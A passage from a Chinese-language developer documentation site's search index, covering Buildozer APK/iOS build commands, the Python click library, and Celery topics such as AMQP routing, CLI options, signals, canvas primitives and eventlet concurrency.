MacOs: python3 -m pip install --user --upgrade Cython==0.29.33 virtualenv # the --user should be removed if you do this in a venv brew install pkg-config sdl2 sdl2_image sdl2_ttf sdl2_mixer gstreamer autoconf automake 通过使用: buildozer android debug 命令来构建debug版本的APK文件， 或者使用: buildozer android release 命令来构建发布版本的APK文件。 这将会自动下载并构建所有必要的依赖项，生成二进制文件，并将其打包到一个APK文件中。 IPA构建(苹果使用) 构建iOS应用程序（可选）。 如果需要构建iOS应用程序，则需要在Mac OS系统上进行，并设置Xcode环境和相关证书等。 可以使用 buildozer ios debug 或 buildozer ios release 命令来构建iOS应用程序。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Buildozer.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Buildozer.html"},{"title":"click","text":"click 是对 Argparse 进行封装后的一个 python 命令行工具 (类似 request 对 urllib 的封装) 命令行工具, 使用装饰器配置选项参数. 普通形式 , 一个函数上打上所有选项参数 组 , 以组的形式使用 普通形式 如: import sys import click @click.command() # 表示包装为 click 指令 @click.option('-u', '--user', type=str, help='username') # 添加选项参数 @click.option('-p', '--password', type=str, help='password') # 添加选项参数 @click.option('-a', '--about', type=str, help='about message', default=None, show_default=True) # 添加选项参数 @click.option('--admin', type=bool, default=False) # 添加选项参数 def run(user: str, password: str, about: str='about message', admin: bool = False): if user == 'xxx': click.echo('login failed', err=True) return elif user and password: click.echo('login success') if admin: click.echo('you are a admin') click.echo(f'{about = }') if __name__ == '__main__': run(sys.argv[1:]) 效果: yanque@yanquedembp with_click % python click_one_f.py --help Usage: click_one_f.py [OPTIONS] Options: -u, --user TEXT username -p, --password TEXT password -a, --about TEXT about message --admin BOOLEAN --help Show this message and exit. yanque@yanquedembp with_click % python click_one_f.py about = None yanque@yanquedembp with_click % python click_one_f.py -u xxx -p xxx login failed yanque@yanquedembp with_click % python click_one_f.py -u xxxx -p xxx login success about = None 组 创建组，就是通过一个主入口函数，去关联其他的函数，其他的函数名可以作为命令直接使用: import sys import click @click.group() def main(): ... @main.command() # 表示包装为 click 指令 @click.option('-u', '--user', required=True, type=str, help='username') # 添加选项参数 def login_user(user: str): ... @main.command() @click.option('-p', '--password', required=True, type=str, help='password') # 添加选项参数 def login_password(password: str): ... if __name__ == '__main__': main(sys.argv[1:]) 效果: yanque@yanquedembp with_click % python click_group_f.py --help Usage: click_group_f.py [OPTIONS] COMMAND [ARGS]... Options: --help Show this message and exit. Commands: login-password login-user 使用 支持单函数使用与group分组使用 @click.group() 分组使用 @click.command() 作为命令行选项使用 @click.argument() 位置参数 @click.option() 关键字参数 - default - type - help - show_default import click @click . command () @click . option ( '-m' , '--msg' , help = 'this is use to echo a msg' ) def show_msg ( msg ): click . echo ( 'input ' + msg ) @click . command () @click . option ( '-i' , # 短选项 '--int_v' , # 长选项， 注意与函数的参数名一致 # type=int, default = 1 , # 用默认值就可以不用 type=int help = 'echo a int value' , show_default = True ) def show_int ( int_v : int ): click . echo ( 'input ' + str ( int_v )) @click . command () @click . argument ( 'name' ) # 相当于 python 位置参数 @click . option ( '-i' , # 短选项， 相当于 python 关键字参数 '--int_v' , # 长选项， 注意与函数的参数名一致 # type=int, default = 1 , # 用默认值就可以不用 type=int help = 'echo a int value' , show_default = True ) def show_int2 ( name , int_v : int ): click . echo ( 'input ' + name + str ( int_v )) @click . group () def use_group (): pass @use_group . command ( help = 'show a msg' ) @click . option ( '-m' , '--msg' , help = 'this is use to echo a msg' ) def group_show_msg ( msg ): click . echo ( 'input ' + msg ) @use_group . command ( help = 'show a integer msg' ) @click . option ( '-i' , # 短选项 '--int_v' , # 长选项， 注意与函数的参数名一致 # type=int, default = 1 , # 用默认值就可以不用 type=int required = True , help = 'echo a int value' , show_default = True ) def group_show_int ( int_v : int ): click . echo ( 'input ' + str ( int_v )) def main (): # # 单个使用方式， 直接调用函数, 一次只能用一个 # # 使用默认值的调用 python3 t_click.py， 输出 input 1 # # 不使用默认值的调用 python3 t_click.py -i 10， 输出 input 10 # show_int() # # show_msg() # group 组的形式， 组会自动关联所有可调用函数(即command) # 一次只能使用一个选项 # python3 t_click.py group-show-msg -m tt # 输出 input tt # python3 t_click.py group-show-int # 输出 input 1 use_group () if __name__ == '__main__' : main () 非装饰器调用 click.echo(...) 类似于 print click.ClickException(...) rasie使用 click.get_current_context() 获取全局上下问, 单线程内有效","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-CLICK.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-CLICK.html"},{"title":"AMQP 入门","text":"celery 基本上全部兼容了 AMQP 的实现, 所以此处对此作一个了解说明. 消息 一个消息由消息头和消息体组成。 Celery 使用消息头来存储消息的内容类型以及内容的编码。 内容类型通常是用来序列化消息的序列化格式， 消息体包含要执行的任务的名称，任务ID(UUID)，执行任务的参数以及一些额外的元数据(比如重试次数和ETA(下次执行任务的时间))。 这是通过一个 Python 的字典来表示的示例任务消息: {'task': 'myapp.tasks.add', 'id': '54086c5e-6193-4575-8308-dbab76798756', 'args': [4, 4], 'kwargs': {}} 生产者，消费者和中间人 发送消息的客户端通常被称为一个发布者，或一个生产者，而接收消息的实体被称为消费者。 中间人是将消息从生产者路由到消费者的消息服务器。 你可能在与AMQP相关的材料中看到这些术语被大量使用。 交换机，队列和路由键 消息将被发送到交换机 交换机将消息路由到一个或者多个队列。存在多种交换机类型来提供不同的消息路由方式，或实现不同的消息发送方案。 消息将在队列中等待直到有人消费它。 一旦消息被确认消费，将会从队列中删除。 发送和接收消息所需要的步骤如下: 创建一个交换机 创建一个队列 绑定队列到交换机。 为了使 task_queues 中的队列工作， Celery 将会自动创建所需要的实体(除非队列的 auto_declare 选项被设置为 False )。 下方是一个包含三个队列的示例队列配置; 一个用于视频，一个用于图片，另一个用于其他消息的默认队列: from kombu import Exchange, Queue app.conf.task_queues = ( Queue('default', Exchange('default'), routing_key='default'), Queue('videos', Exchange('media'), routing_key='media.video'), Queue('images', Exchange('media'), routing_key='media.image'), ) app.conf.task_default_queue = 'default' app.conf.task_default_exchange_type = 'direct' app.conf.task_default_routing_key = 'default' 交换机类型 直连交换机 主题交换机 交换机的类型定义了交换机将会如何路由消息。 在正常情况下交换机被定义为 direct, topic, fanout。 此外也可以通过 RabbitMQ 的插件来使用非标准的交换机类型， 比如由 Michael Bridgen 实现的 last-value-cache plug-in 。 直连交换机 直连交换机通过精确的路由键来进行匹配，所以被路由键 video 绑定的队列只接收具有该路由键的消息。 主题交换机 主题交换机通过以点分隔的单词和通配符来匹配路由键: *(匹配单个单词) #(匹配零或多个单词)。 假如有如下路由键: usa.news usa.weather norway.news norway.weather 可以通过绑定 *.news 来接收所有的新闻， 绑定 usa.# 来接收与 USA 有关的所有消息， 或绑定 usa.weather 来接收所有与 USA 天气有关的消息。 相关的API命令 declare 通过名称声明交换机 declare 注解 声明并不代表创建，在你声明的时候，你可以断定这个实体已经存在，并且是可操作的。 这里并没有规定消费者或生产者中的哪一方需要最先创建交换机/队列/绑定。 通常来说，最先需要它的哪一方就会创建它。 使用 API Celery 自带了一个名为 celery amqp 的工具，用于通过命令行来操作 AMQP API 去管理任务， 比如说创建或者删除队列或交换机，清理队列或发送消息。 该工具也可以用于 非 AMQP 的中间人，但是不一定实现了所有的命令操作。 你可以直接在`celery amqp 的命令里写参数，或者无参数启动命令模式: $ celery -A proj amqp -> connecting to amqp://guest@localhost:5672/. -> connected. 1> 这里的 1> 是命令提示。数字 1 表示到目前为止指定的命令数。 输入 help 可以得到所有可用的命令列表。工具还支持自动补全，所以你可以输入一个命令然后按 tab 键来显示可能匹配到的命令列表。 让我们创建一个你可以发送消息的队列: 1> exchange.declare testexchange direct ok. 2> queue.declare testqueue ok. queue:testqueue messages:0 consumers:0. 3> queue.bind testqueue testexchange testkey ok. 上方的命令创建了一个直连交换机 testexchange 和一个名为 testqueue 的队列。该队列通过路由键 testkey 绑定到直连交换机。 从现在开始，所有发送到 testexchange 交换机的带有路由键testkey 的消息将被移动到队列 testqueue 中。 你可以通过 basic.publish 命令发送一条消息: 4> basic.publish 'This is a message!' testexchange testkey ok. 现在消息已经发送出去，你可以去获取消息了。 你可以在这里使用 basic.get 命令，该命令将会以同步轮询的方式去获取队列中的新消息 (这种方式对于维护任务来说是还可以的，但是对于服务来说，你需要使用 basic.consume命令来代替它) 从队列中弹出一条消息: {'body': 'This is a message!', 'delivery_info': {'delivery_tag': 1, 'exchange': u'testexchange', 'message_count': 0, 'redelivered': False, 'routing_key': u'testkey'}, 'properties': {}} AMQP 使用确认来表明一条消息已经被接收并且成功处理。 如果消息没有被确认并且消费者的通道关闭了，消息将被传递给另一个消费者。 请注意上方结构中列出来的传递标记 delivery_tag ; 再每个连接通道中，每个接收到的消息都有一个唯一的传递标记，这个标记用来确认消息。 但是要注意，传递标记并不是跨连接唯一的，所以在另一个客户端中，传递标记为 1 的消息可能与当前连接中的消息是不一致的。 你可以通过 basic.ack 命令来确认你收到的消息: 6> basic.ack 1 ok. 在我们的测试回话结束后，你应该清除你创建的实体: 7> queue.delete testqueue ok. 0 messages deleted. 8> exchange.delete testexchange ok. 路由任务 队列声明 在 Celery 存在的队列可以通过 task_queues 来设置。 下方是一个包含三个队列的示例队列配置; 一个用于视频，一个用于图片，另一个用于其他消息的默认队列: default_exchange = Exchange('default', type='direct') media_exchange = Exchange('media', type='direct') app.conf.task_queues = ( Queue('default', default_exchange, routing_key='default'), Queue('videos', media_exchange, routing_key='media.video'), Queue('images', media_exchange, routing_key='media.image') ) app.conf.task_default_queue = 'default' app.conf.task_default_exchange = 'default' app.conf.task_default_routing_key = 'default' 在这里 task_default_queue 指定队列将被用于路由那些没有显示指定队列的任务。 task_default_exchange，exchange type 以及routing key 将被用作于任务的默认值， 并且也被用作于 task_queues 中的实体的默认值。 对单个队列的多个绑定也是被支持的。如下一个两个路由键同时绑定于同一个队列的例子: from kombu import Exchange, Queue, binding media_exchange = Exchange('media', type='direct') CELERY_QUEUES = ( Queue('media', [ binding(media_exchange, routing_key='media.video'), binding(media_exchange, routing_key='media.image'), ]), ) 指定任务目标 任务的目标是通过如下的(按顺序)的方式决定的: Task.apply_async 的路由参数 在任务本身定义的路由参数 在 task_routes 中定义的 Routers 最好的做法是不在配置中进行硬编码，而是将其作为 Routers 的配置。这是最灵活的，并且合理的默认值仍然可以设置为任务的属性。 路由器 路由器是决定任务的路由选项的函数。 定义一个新的路由器，你所需要做的是通过签名 (name, args, kwargs, options, task=None, **kw) 定义一个函数: def route_task(name, args, kwargs, options, task=None, **kw): if name == 'myapp.tasks.compress_video': return {'exchange': 'video', 'exchange_type': 'topic', 'routing_key': 'video.compress'} 如果你返回队列的键值，它将会带着在task_queues 中定义的配置展开: {'queue': 'video', 'routing_key': 'video.compress'} 变成 -> {'queue': 'video', 'exchange': 'video', 'exchange_type': 'topic', 'routing_key': 'video.compress'} 你可以通过将路由器的类添加到 task_routes 的配置中来安装路由器: task_routes = (route_task,) 路由器方法也可以通过名称添加: task_routes = ('myapp.routers.route_task',) 对于类似上方示例的简单的任务名称->路由映射，你可以简单地将字典放置在 task_routes 中来过的同样的行为效果: task_routes = { 'myapp.tasks.compress_video': { 'queue': 'video', 'routing_key': 'video.compress', }, } 将会按照顺序遍历路由器，直到在第一个返回真的路由器处停止，并将该路由器用作为任务的最终路由器。 你也可以将多个路由器定义在一个序列中: task_routes = [ route_task, { 'myapp.tasks.compress_video': { 'queue': 'video', 'routing_key': 'video.compress', }, ] 路由器将会被按顺序访问，并选择第一个返回的值。 如果你使用的是 Redis 或 RabbitMQ ，你也可以在路由器中指定队列的默认优先级: task_routes = { 'myapp.tasks.compress_video': { 'queue': 'video', 'routing_key': 'video.compress', 'priority': 10, }, } 类似的，对任务使用 apply_async 调用时，传递的参数将会覆盖默认的优先级: task.apply_async(priority=0) 优先级顺序和集群响应 需要重视的是，因为职程(worker) 的预取机制，如果同一时间提交了一堆任务，那么它们的优先级顺序可能发生混乱。 禁用职程的预取可以防止该问题，但是对于小而快的任务，这么做会导致达不到理想的性能。 在大多数情况下，简单的将 worker_prefetch_multiplier 参数减少到 1， 是一个简单而清晰的方式来提升系统的灵敏性，并且不会存在禁用预取带来的成本。 要注意的是优先级的顺序是按照值的反序来排列的：0 是最高优先级。 广播 Celery 也支持广播路由。下面是一个 broadcast_tasks 交换机的示例, 它将任务分发给所有连接到它的职程: from kombu.common import Broadcast app.conf.task_queues = (Broadcast('broadcast_tasks'),) app.conf.task_routes = { 'tasks.reload_cache': { 'queue': 'broadcast_tasks', 'exchange': 'broadcast_tasks' } } 现在任务 tasks.reload_cache 将会被被发送给从当前队列中消费的所有职程。 如下是另一个关于广播路由的任务，这次使用了 celery beat 定时器: from kombu.common import Broadcast from celery.schedules import crontab app.conf.task_queues = (Broadcast('broadcast_tasks'),) app.conf.beat_schedule = { 'test-task': { 'task': 'tasks.reload_cache', 'schedule': crontab(minute=0, hour='*/3'), 'options': {'exchange': 'broadcast_tasks'} }, } 广播和结果 注意 Celery 结果并没有定义如果有两个任务使用同一个任务 ID 时会发生什么。 如果同一个人任务被派发到多于一个职程，该任务的状态历史将不被保留。 在这种情况下设置 task.ignore_result 属性忽略任务结果将会是个好主意。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-AMQP-Introduction.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-AMQP-Introduction.html"},{"title":"应用设计(编码)拓展","text":"任务基类更新 装饰器的 base 参数可以指定继承的任务基类: import celery class MyTask(celery.Task): def on_failure(self, exc, task_id, args, kwargs, einfo): print('{0!r} failed: {1!r}'.format(task_id, exc)) @task(base=MyTask) def add(x, y): raise KeyError() 也可以手动直接更新 app 基类属性: >>> from celery import Celery, Task >>> app = Celery() >>> class MyBaseTask(Task): ... queue = 'hipri' >>> app.Task = MyBaseTask >>> app.Task <unbound MyBaseTask> >>> @app.task ... def add(x, y): ... return x + y >>> add <@task: __main__.add> >>> add.__class__.mro() [<class add of <Celery __main__:0x1012b4410>>, <unbound MyBaseTask>, <unbound Task>, <type 'object'>] 调用实例方法 在 celery 中也叫绑定方法, 使用 bind 参数 被绑定的任务意味着任务的第一个参数总是任务实例（self），就像Python绑定方法一样: logger = get_task_logger(__name__) @task(bind=True) def add(self, x, y): logger.info(self.request.id) 注意这里的 self 是 task 实例","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Application-design-expansion.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Application-design-expansion.html"},{"title":"命令行选项说明","text":"语法, Celery command entrypoint celery [OPTIONS] COMMAND [ARGS]... 选项参数 -A , --app 指定运行的 Celery 应用程序实例，格式必须为 module.path:attribute 但如果只设置包名，它将进行搜索app实例, 详细见 app_args -b , --broker TEXT, 中间人, 会覆盖代码里的配置 --result-backend TEXT, 结果后端 --loader TEXT --config TEXT --workdir PATH, 工作目录 -C , --no-color 无颜色? -q , --quiet 安静模式? --version 版本信息 --help Show this message and exit. 支持的命令 关于 app 参数说明: 使用 --app 参数可也指定运行的 Celery 应用程序实例，格式必须为 module.path:attribute 但如果只设置包名，它将进行搜索app实例，顺序如下: 用 --app=proj: 名为 proj.app 的属性. 名为 proj.celery 的属性 模块 proj 中值为 Celery 应用程序的任何属性，如果还没有找到，将尝试检索名为 proj.celery的子模块 名为 proj.celery.app 的属性 名为 proj.celery.celery 的属性 模块 proj.celery 中值为 Celery 应用程序的任何属性 在此方案模仿文档中使用的实例，即 针对单个模块包含的proj:app ，以及 大型项目的 proj.celery:app 注解 使用 celery 5.2 貌似不能自动识别 proj.app 了. 自动识别的话只能写 celery.py 支持的命令 Commands: amqp 打开 AMQP Shell. beat 启动节拍周期任务调度程序. call 命令行调用一个任务. control Workers 远程控制. events 事件流实用程序. graph The ``celery graph`` command. inspect 检查运行的Worker. list 从中间人 broker 获取信息. logtool The ``celery logtool`` command. migrate 将任务从一个 broker 迁移到另一个 代理(broker). multi 启动多个 worker 实例. purge 清除所有已知任务队列中的所有消息. report 显示可包括在错误报告中的有用信息. result 打印给定 任务ID(task id) 的返回值. shell 打开一个 shell 会话来便捷访问 celery. status 查看所有 workers 状态. upgrade 查看版本升级信息. worker 启动 worker 实例. 注解 注意, 像 status 这样的命令需要手动指定配置: % celery -b redis://localhost:6379/0 status -> celery@yanquedembp.local: OK 1 node online. 若使用配置文件: % celery --config src.time_schedule.celery_conf status -> celery@yanquedembp.local: OK 1 node online. 或者直接指定应用: % celery -A src.time_schedule status -> celery@yanquedembp.local: OK 1 node online. worker 用法: celery worker [OPTIONS] 启动一个 worker 实例. Examples: $ celery --app=proj worker -l INFO $ celery -A proj worker -l INFO -Q hipri,lopri $ celery -A proj worker --concurrency=4 $ celery -A proj worker --concurrency=1000 -P eventlet $ celery worker --autoscale=10,0 消费者选项 Worker Options: -n , --hostname HOSTNAME 设定自定义主机名 (e.g., w1@%%h ). Expands: %%h (hostname), %%n (name) and %%d, (domain). -D , --detach 以后台进程的形式启动 Start worker as a background process. -S , --statedb PATH 状态数据库的路径, 文件为 db 后缀 Path to the state database. The extension '.db' may be appended to the filename. -O <[default|fair]> 应用优化配置文件. -l , --loglevel <[DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL]> 日志等级. --prefetch-multiplier <prefetch multiplier> Set custom prefetch multiplier value for this worker instance. 这个没懂 线程/进程池选项 Pool Options: -c , --concurrency <concurrency> 队列的进程数目, 默认为CPU个数. -P , --pool <[prefork|eventlet|gevent|solo|processes|threads]> 使用那种池方式. 进程池/线程池/时间池. -E , --task-events , --events 发送任务相关的时间能够被 (celery 事件、 celerymon、 other) 监视捕获 --time-limit FLOAT 强制设置任务时间限制. 单位: 秒; 类型: int/float --soft-time-limit FLOAT 设置软时间限制. 单位: 秒; 类型: int/float. 不知道与上一个区别在哪. --max-tasks-per-child INTEGER 每个消费者池能够执行的最大任务数, 若超过将会使用一个新的消费者进程池(worker)替代 --max-memory-per-child INTEGER 最大驻留内存. 单位: Kib. 若耗尽将会使用一个新的 消费者进程池(worker). 若存在单个任务就超过了最大驻留内存, 在完成此任务后, 才会使用新的 消费者进程池(worker) 来替换. 默认无限制. 队列选项 Queue Options: -Q , --queues <COMMA SEPARATED LIST> 队列, 多个使用逗号分隔 -X , --exclude-queues <COMMA SEPARATED LIST> 排除队列, 多个使用逗号分隔 -I , --include <COMMA SEPARATED LIST> 包含队列, 多个使用逗号分隔 --purge , --discard 清除队列, 多个使用逗号分隔 --discard 清除队列, 多个使用逗号分隔 功能: --without-gossip --without-mingle --without-heartbeat --heartbeat-interval INTEGER --autoscale <MIN WORKERS>, <MAX WORKERS> Embedded Beat Options: -B, --beat -s, --schedule-filename, --schedule TEXT --scheduler TEXT Daemonization Options: -f, --logfile TEXT --pidfile TEXT --uid TEXT --uid TEXT --gid TEXT --umask TEXT --executable TEXT beat 用法: celery beat [OPTIONS] 启动周期任务调度, 设置 contrab 任务等定时任务时, 需要使用此命令来发现注册定时任务. Beat Options: --detach 作为守护进程独立执行 -s , --schedule TEXT 执行数据库的路径. 默认为 celerybeat-schedule . The extension '.db' may be appended to the filename. -S , --scheduler TEXT 使用哪个调度器(scheduler)类 --max-interval INTEGER 调度器轮询的间隔时间. 不确定是每次任务周期的间隔(多个任务都执行完成一次, 组成一个任务周期), 还是每个任务之间的间隔. 应是后者. -l , --loglevel <[DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL]> 日志等级 守护线程执行选项 Daemonization Options: -f , --logfile TEXT 日志文件名 --pidfile TEXT pid文件名 --uid TEXT uid --gid TEXT gid --umask TEXT 创建文件的umask值 --executable TEXT 不知道... status 用法: celery status [OPTIONS] 查看在线的 Worker 节点. 远程控制选项 Remote Control Options: -t , --timeout FLOAT 设置检查超时时间. -d , --destination <COMMA SEPARATED LIST> 检查的目标节点列表. 逗号分隔. -j , --json 使用json格式输出. graph 用法: celery graph [OPTIONS] COMMAND [ARGS]... 图形化显示? 实际使用效果是json格式的相关输出信息. 命令: bootsteps 显示引导步骤图. workers 显示 workers graph. 例: celery --config src.time_schedule.celery_conf graph workers call 使用: celery call [OPTIONS] NAME 根据任务名调用任务. 调用选项 Calling Options: -a , --args <JSON ARRAY> 位置参数. -k , --kwargs <JSON OBJECT> 关键字参数字典. --eta ISO-86091 执行时间. --countdown FLOAT eta in seconds from now. --expires <ISO-86091 OR FLOAT> 过期时间. --serializer TEXT 任务序列化方式. 路由选项 Routing Options: --queue TEXT 自定义队列名. --exchange TEXT 自定义交换机名. --routing-key TEXT 路由key. 例: celery -A src.time_schedule call -a '[2, 2]' src.time_schedule.pre_tasks.add 7506ef60-5621-460a-8219-7a97f6e96f4e 公共选项 --help Show this message and exit. 一些常用命令 设置并发数 worker -c 设置并发数, 默认数为cpu数: -c, --concurrency <concurrency> Number of child processes processing the queue. The default is the number of CPUs available on your system. 设置日志级别 worker -l 设置日志信息: -l, --loglevel [DEBUG|INFO|WARNING|ERROR|CRITICAL|FATAL] Logging level. 后台运行 celery multi 后台运行, 但是看新版本指令帮助信息貌似又不支持: celery multi --help Usage: celery multi [OPTIONS] Start multiple worker instances. Options: --help Show this message and exit. 启动: celery multi start w1 -A proj -l info 重启: celery multi restart w1 -A proj -l info 停止运行: $ celery multi stop w1 -A proj -l info stop 命令是异步的，所以不会等待职程（Worker）关闭。可以通过 stopwait 命令进行停止运行，可以保证在退出之前完成当前正在执行的任务: $ celery multi stopwait w1 -A proj -l info 默认情况下会在当前目录中创建pid文件和日志文件，为防止多个职程（Worker）干扰，建议将这些文件存放在专门的目录中: $ mkdir -p /var/run/celery $ mkdir -p /var/log/celery $ celery multi start w1 -A proj -l info --pidfile=/var/run/celery/%n.pid \\ --logfile=/var/log/celery/%n%I.log 也可以使用 multi 命令启动多个职程（Worker），有一个强大的语法为不同职程（Worker）设置不同的参数: $ celery multi start 10 -A proj -l info -Q:1-3 images,video -Q:4,5 data \\ -Q default -L:4,5 debug","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Command-line-tool.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Command-line-tool.html"},{"title":"自定义异常","text":"Python 的异常必须要符合一些简单规则，才能被 pickle 模块支持以及序列化。 使用 Pickle 作为序列化器时，引发不可拾取异常的任务将无法正常工作。 为确保异常是可被处理的，异常必须要在 .args 属性中提供初始化的参数。最简单的方法就是使用异常调用 Exception.__init__ 让我们来看一些有用的例子，还有一个不适用的例子: # OK: class HttpError(Exception): pass # BAD: class HttpError(Exception): def __init__(self, status_code): self.status_code = status_code # OK: class HttpError(Exception): def __init__(self, status_code): self.status_code = status_code Exception.__init__(self, status_code) # <-- REQUIRED 所以规则是：对于任何支持自定义参数 *args 的异常，都必须使用 Exception.__init__(self, *args) 关键字参数没有特殊支持，如果需要保存关键字参数，当异常被 unpickled 时，需要将它们作为普通的参数进行传递: class HttpError(Exception): def __init__(self, status_code, headers=None, body=None): self.status_code = status_code self.headers = headers self.body = body super(HttpError, self).__init__(status_code, headers, body)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Exception.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Exception.html"},{"title":"信号","text":"当某些动作在应用中的其他位置触发时，信号允许解耦的应用接收到通知。 Celery 附带了很多信号，您的应用可以嵌入这些信号来增加某些动作的额外行为。 基本 一些事件触发信号，你可以连接到这些信号以在它们被触发时执行一些操作。 连接到 after_task_publish 信号的示例: from celery.signals import after_task_publish @after_task_publish.connect def task_sent_handler(sender=None, headers=None, body=None, **kwargs): # 任务的信息位于任务信息的标题中 # 使用第二版的任务协议. info = headers if 'task' in headers else body print('after_task_publish for task id {info[id]}'.format( info=info, )) 一些信号也有一个你可以进行过滤的发送者。 比如 after_task_publish 信号使用任务的名称作为发送者，所以通过提供发送者的参数进行连接，你可以在每次名称为 proj.tasks.add 的任务被发布时连接要被调用的处理函数: @after_task_publish.connect(sender='proj.tasks.add') def task_sent_handler(sender=None, headers=None, body=None, **kwargs): # information about task are located in headers for task messages # using the task protocol version 2. info = headers if 'task' in headers else body print('after_task_publish for task id {info[id]}'.format( info=info, )) 信号使用与 django.core.dispatch 相同的实现，所以在默认情况下，其他的关键字参数(如 singal) 将被传递到所有的信号处理函数里。 信号处理的最佳实践是接受任意的关键字参数(如, **kwargs)。这种方式使得新的 Celery 版本可以在不影响用户代码的情况下添加可选参数。 任务信号 before_task_publish 在 3.1 版本引入 在任务发布之前派发。注意，这是在发送任务的过程中执行的。 发送者时被发布的任务的名称。 提供的参数: body 任务消息体 这是一个包含任务消息字段的映射，有关定义的可能字段的参考，请参阅 Version 2 和 Version 1。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Signal.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-Signal.html"},{"title":"canvas","text":"celery 的 canvas 应当值得是一种设计流程, 目前不是很理解. 签名 有时候可能希望将任务调用的签名传递给另外一个进程或其他函数的参数，Celery 提供了签名。 签名通过一种方式进行封装任务调用的参数以及执行选项，便于传递给他的函数，甚至通过序列化通过网络传送。 可以将 add 使用的参数作为任务创建的签名，倒计时为 10 秒，如下所示（2,2）: >>> add.signature((2, 2), countdown=10) tasks.add(2, 2) 也可以通过一个快捷的方式进行操作: >>> add.s(2, 2) tasks.add(2, 2) 签名实例支持调用API：这就意味着可以使用 delay 和 apply_async 方法。 但区别就在于签名实例已经指定了参数签名，该 add 任务有两个参数，需要指定两个参数的签名才能够成一个完整的签名实例: >>> s1 = add.s(2, 2) >>> res = s1.delay() >>> res.get() 4 也可以创建不完整的签名来进行创建: # incomplete partial: add(?, 2) >>> s2 = add.s(2) 也可以设置新的参值，新设置的参数会覆盖原有的参数值: >>> s3 = add.s(2, 2, debug=True) >>> s3.delay(debug=False) # debug is now False. 不变签名 不变性(Immutability) 部分参数通常在回调中使用，父任务的结果将会作为参数传递给链接或chord的回调任务。 有时你希望指明一个不需要参数的回调，这时你可以设置签名为不变的: >>> add.apply_async((2, 2), link=reset_buffers.signature(immutable=True)) 快捷方式 .si() 也能创建不变签名: >>> add.apply_async((2, 2), link=reset_buffers.si()) 对于不变签名，只有执行选项可以进行设置，并无法使用部分参数和关键词参数。 回调 任务可以使用 apply_async 的 link 参数来添加回调: add.apply_async((2, 2), link=other_task.s()) 只有当任务成功退出，回调函数才能被执行，并且将父任务的结果作为参数传递给回调的任务。 如前所述，新传递的参数将会添加在签名指定的参数前。 如果你有一个签名: >>> sig = add.s(10) 接着 sig.delay(result) 将变为: >>> add.apply_async(args=(result, 10)) 现在，让我们调用 add 任务，并设置回调: >>> add.apply_async((2, 2), link=add.s(8)) 正如预期，首先第一个任务将会计算 2 + 2，接着回调任务将会计算 4 + 8。 组 组：Groups 一个 group 并行调用任务列表，返回一个特殊的结果实例，可以将结果作为一个列表进行查看，并且通过索引进去获取返回值: >>> from celery import group, add >>> group(add.s(i, i) for i in xrange(10))().get() [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] Partial group: >>> g = group(add.s(i) for i in xrange(10)) >>> g(10).get() [10, 11, 12, 13, 14, 15, 16, 17, 18, 19] 链 链：Chains 可以将任务链接在一起，在一个人返回后进行调用另外一个任务: >>> from celery import chain >>> from proj.tasks import add, mul # (4 + 4) * 8 >>> chain(add.s(4, 4) | mul.s(8))().get() 64 或 partial chain: >>> # (? + 4) * 8 >>> g = chain(add.s(4) | mul.s(8)) >>> g(4).get() 64 链也可以这样写: >>> (add.s(4, 4) | mul.s(8))().get() 64 和弦 和弦：Chords 和弦是一个带有回调的组: >>> from celery import chord >>> from proj.tasks import add, xsum >>> chord((add.s(i, i) for i in xrange(10)), xsum.s())().get() 90 链接到其他任务的组将自动转换为和弦: >>> (group(add.s(i, i) for i in xrange(10)) | xsum.s())().get() 90 这些原语都是签名的类型，可以根据需要进行组合，例如: >>> upload_document.s(file) | group(apply_filter.s() for filter in filters)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-canvas.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-canvas.html"},{"title":"并发","text":"基于 Eventlet 的并发 Celery 支持 Eventlet 作为可选执行池的实现，在某些情况下要优于 prefork 。 但是你需要确保一项任务不会太长时间阻塞事件循环。 一般来说，与 CPU 绑定的操作不适用与 Eventlet。 并且还要注意的是，一些第三方的库，通常指带有C扩展的，由于无法使用猴子补丁，因此不能从使用 Eventet 中获得益处。 如果你无法确定，可以参考它们的官方文档。 如 pylibmc 不允许于 Eventlet 一起使 用，但是 psycopg2 可以，虽然它们都是带有 C 扩展的库。 prefork 池是利用多进程，但是数量受限于每个 CPU 只能有几个进程。 使用 Eventlet，您可以有效地产生数百或者数千个绿色线程。 在一个动态中转系统的非正式测试中，Eventlet 池可以每秒获取并处理数百个动态，而 prefork 池处理 100 条动态花费了14秒之多。 但请注意，这是 异步 I/O 的优势所在(异步的HTTP请求)。 您也许需要将 Eventlet 和 prefork 职程搭配使用，并根据兼容性或者最适合处理的角度来路由任务。 启用 Eventlet 你可以使用 Celery 的职程参数 -P 来启用 Eventlet: $ celery -A proj worker -P eventlet -c 1000 示例 有关使用 Eventlet 支持的示例，请参阅 Celery 发行版本的 Eventlet 示例 文件夹","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-concurrent.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-concurrent.html"},{"title":"基于redis的配置","text":"此处只介绍redis相关配置, 更多配置见 /docs/后端/python/python三方库/celery_more/conf_celery redis相关配置 默认使用的 rabbitmq, 所以用 redis 需要先安装以来库(若没安装): pip 